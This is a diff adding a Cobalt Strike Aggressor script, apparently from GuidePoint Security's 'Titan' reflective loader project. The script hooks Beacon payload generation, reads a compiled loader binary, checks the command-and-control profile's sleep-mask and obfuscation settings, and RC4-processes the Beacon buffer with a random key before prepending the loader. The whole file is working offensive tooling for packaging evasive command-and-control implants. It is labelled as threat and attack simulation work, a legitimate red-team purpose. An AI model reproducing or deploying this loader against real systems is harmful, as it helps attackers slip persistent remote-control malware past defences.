@@ -1,0 +1,101 @@
+##
+## Reflective Loader
+##
+## GuidePoint Security LLC
+##
+## Threat and Attack Simulation
+##
+
+import javax.crypto.spec.*;
+import java.security.*;
+import javax.crypto.*;
+
+##
+## Generates a random string ( @offsecginger )
+##
+sub random_string {
+	$limit = $1;
+	@random_str = @();
+	$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+	for ($x = 0; $x < $limit; $x++) {
+		$n = rand(strlen($characters));
+		add(@random_str, charAt($characters, $n));
+	}
+	return join('', @random_str);
+}
+
+##
+## Inserts titan into Beacon
+##
+set BEACON_RDLL_GENERATE {
+
+	##
+	## Open up titan.
+	##
+	$hnd = openf( script_resource( "Titan.". $3 .".bin" ) );
+	$ldr = readb( $hnd, -1 );
+	closef( $hnd );
+
+	if ( strlen( $ldr ) == 0 ) {
+		##
+		## Titan was not compiled.
+		##
+		warn( 'titan has not been compiled, using standard cobalt loader.' );
+		return $null;
+	};
+
+	$prf = data_query( "metadata" )["c2profile"];
+	if ( [ $prf getString: ".stage.sleep_mask" ] eq "true" ) {
+		if ( [ $prf getString: ".stage.obfuscate" ] eq "false" ) {
+			##
+			## We cannot use sleep_mask with Titan if obfuscate = False
+			##
+			warn( 'titan cannot be used with sleep_mask if obfuscate is set to false' );
+			return $null;
+		};
+	};
+
+	##
+	## Ask questions about whether we need workstation
+	## or other tweaks inserted into the payload on the
+	## fly.
+	##
+	
+	println( ' ___________________   _  __' );
+	println( '/_  __/  _/_  __/ _ | / |/ /' );
+	println( ' / / _/ /  / / / __ |/    / ' );
+	println( '/_/ /___/ /_/ /_/ |_/_/|_/  ' );
+	println( '============================' );
+	println( 'Reflective Loader by Austin ' );
+	println( 'GuidePoint Security LLC' );
+	println( '============================' );
+
+	##
+	## Encrypt the incoming buffer with RC4. Then
+	## we build a structure information titan of
+	## the key.
+	##
+
+	$str = random_string( "16" );
+	$cip = [ Cipher getInstance: "RC4" ];
+	$key = [ new SecretKeySpec: $str, "RC4" ];
+	[ $cip init: [ Cipher DECRYPT_MODE ], $key ];
+	$buf = [ $cip doFinal: $2 ];
+	$inf  = pack( 'I+', strlen( $buf ) );
+	$inf .= $str . $buf;
+
+	println( "ARC4: ". $str );
+	println( "SIZE: ". strlen( $ldr . $inf ) );
+
+	##
+	## Return Information
+	##
+	return $ldr . $inf;
+};
+
+##
+## Size
+##
+set BEACON_RDLL_SIZE {
+	return "0";
+};
